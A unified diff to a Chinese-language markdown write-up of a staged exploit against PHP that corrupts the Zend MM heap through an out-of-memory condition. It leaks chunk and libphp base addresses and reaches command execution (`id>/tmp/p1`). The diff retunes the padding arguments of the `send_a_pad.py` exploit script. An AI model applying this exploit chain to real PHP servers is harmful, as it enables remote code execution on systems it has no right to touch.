@@ -24,7 +24,7 @@ OOM）让 Zend MM 堆损坏，紧跟一个会初始化 session 的 B 请求即�
 |---|---|---|---|
 | 1 | `send_a_leak2.py 1001 12` | `b_numleak2.py 892 1 0x1000` | Zend MM chunk base |
 | 2 | `send_a_leak3.py 1001 5 39 12 17` | `b_target.py 443 16 983` | libphp base |
-| 3 | `send_a_pad.py 17 19 3 12` + 6×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |
+| 3 | `send_a_pad.py 17 19 3 12` + `8:7` + 5×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |
 
 阶段 1 的机制、证据见 [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)。
 本文记录阶段 2、3 和完整驱动。
@@ -199,7 +199,7 @@ php_session_track_init()
 
 ### 3.3 exploit 请求形状（`use_cookies=1` 下校准）
 
-- A：`send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7`
+- A：`send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7`
   - 6 个 pad 让悬空 reference `R0 = chunk + 0x24e0`，
     `R0-0x10` 是 56B block 起点；
 - B：`send_b_zif.py 15 2 <HTDATA> <ZIF> "id>/tmp/p1"`
